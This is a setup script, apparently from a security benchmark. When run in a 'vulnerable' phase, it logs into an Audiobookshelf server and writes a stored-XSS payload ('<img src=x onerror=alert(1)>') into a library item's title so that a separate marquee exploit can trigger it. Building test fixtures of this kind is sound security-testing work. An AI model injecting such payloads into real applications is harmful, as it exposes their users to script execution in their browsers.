#!/usr/bin/env bash
# Seed one library item with long HTML-bearing title metadata so the marquee exploit
# can find a "marquee-triggerable" field (path contains "title", value length >= 40).
# Stock CI database may lack any such item; without this, CI fails with
# "no marquee-triggerable malicious metadata found".
#
# Only for MCB_PHASE=vulnerable (see report-0 prepare_app.sh for rationale).
set -euo pipefail

phase_lc="$(printf '%s' "${MCB_PHASE:-}" | tr '[:upper:]' '[:lower:]')"
if [ "$phase_lc" != "vulnerable" ]; then
  echo "[prepare_app] Skipping Audiobookshelf seed (MCB_PHASE=${MCB_PHASE:-unset}, need vulnerable)"
  exit 0
fi

SERVER_URL="${ABS_SERVER_URL:-http://127.0.0.1:13378}"
USERNAME="${MCB_USERNAME:-usera}"
PASSWORD="${MCB_PASSWORD:-userAPW123}"
COMMON_PY="$(cd "$(dirname "${BASH_SOURCE[0]}")/exploit_files" && pwd)/audiobookshelf_common.py"

python3 - "$COMMON_PY" "$SERVER_URL" "$USERNAME" "$PASSWORD" <<'PY'
import importlib.util
import sys
import time
from pathlib import Path

COMMON_PY, SERVER_URL, USERNAME, PASSWORD = sys.argv[1:5]
spec = importlib.util.spec_from_file_location("audiobookshelf_common", COMMON_PY)
common = importlib.util.module_from_spec(spec)
spec.loader.exec_module(common)
MIN_SCROLL_LENGTH = 40
SEED_TITLE = (
    "harmharmharm <img src=x onerror=alert(1)> audiobookshelf-ci-seed-marquee-padding-zz"
)
try:
    common.wait_for_server(SERVER_URL)
    token = common.login(SERVER_URL, USERNAME, PASSWORD, timeout=60)
    libraries = common.get_libraries(SERVER_URL, token, timeout=60)
except RuntimeError as exc:
    print(f"[prepare_app] ERROR: {exc}", file=sys.stderr)
    raise SystemExit(1)
if not libraries:
    print("[prepare_app] ERROR: no libraries in server state", file=sys.stderr)
    raise SystemExit(1)

library_id = None
item_id = None
for lib in libraries:
    lid = lib.get("id")
    if not lid:
        continue
    results = common.get_items(SERVER_URL, token, lid, limit=50, timeout=60)
    if results:
        library_id = lid
        item_id = results[0].get("id")
        break

if not library_id or not item_id:
    print("[prepare_app] ERROR: no library items to seed", file=sys.stderr)
    raise SystemExit(1)

status, _, _ = common.request_json(
    SERVER_URL,
    "PATCH",
    f"/api/items/{item_id}/media",
    token=token,
    data={"metadata": {"title": SEED_TITLE}},
    timeout=60,
)
if status != 200:
    print(
        f"[prepare_app] ERROR: PATCH /api/items/{item_id}/media status={status}",
        file=sys.stderr,
    )
    raise SystemExit(1)

scan_status, _, _ = common.request_json(
    SERVER_URL,
    "POST",
    f"/api/items/{item_id}/scan",
    token=token,
    data={},
    timeout=60,
)
if scan_status != 200:
    print("[prepare_app] WARNING: POST /scan did not succeed (continuing)", file=sys.stderr)
time.sleep(2)

results = common.get_items(SERVER_URL, token, library_id, limit=50, timeout=60)
match = next((it for it in results if it.get("id") == item_id), None)
if not match:
    print("[prepare_app] ERROR: seeded item not found after update", file=sys.stderr)
    raise SystemExit(1)
if not [
    field for field in common.iter_marquee_fields(match, min_length=MIN_SCROLL_LENGTH)
]:
    print(
        "[prepare_app] ERROR: seeded item has no marquee-triggerable HTML metadata after update",
        file=sys.stderr,
    )
    raise SystemExit(1)

print(
    f"[prepare_app] Seeded marquee-bearing title on item={item_id} library={library_id}"
)
PY
